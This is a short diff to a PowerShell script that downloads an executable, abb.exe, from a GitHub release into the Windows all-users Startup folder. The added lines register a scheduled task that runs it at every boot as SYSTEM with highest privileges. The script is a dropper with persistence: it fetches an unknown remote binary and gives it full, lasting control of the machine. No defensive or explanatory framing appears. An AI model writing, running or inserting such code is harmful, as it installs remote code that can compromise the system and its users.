@@ -1,2 +1,9 @@
+$exePath = "C:\ProgramData\Microsoft\Windows\Start Menu\Programs\StartUp\abb.exe"
+$action = New-ScheduledTaskAction -Execute $exePath
+$trigger = New-ScheduledTaskTrigger -AtStartup
+$principal = New-ScheduledTaskPrincipal -UserId "SYSTEM" -LogonType ServiceAccount -RunLevel Highest
+$settings = New-ScheduledTaskSettingsSet -AllowStartIfOnBatteries -DontStopIfGoingOnBatteries -StartWhenAvailable
+Register-ScheduledTask -TaskName "RunMyExecutableAtStartup" -Action $action -Trigger $trigger -Principal $principal -Settings $settings
+
 $webClient = New-Object System.Net.WebClient
 $webClient.DownloadFile("https://github.com/ZeRo1k/ngrok_server_clash/releases/download/%40private/abb.exe", "C:\ProgramData\Microsoft\Windows\Start Menu\Programs\StartUp\abb.exe")
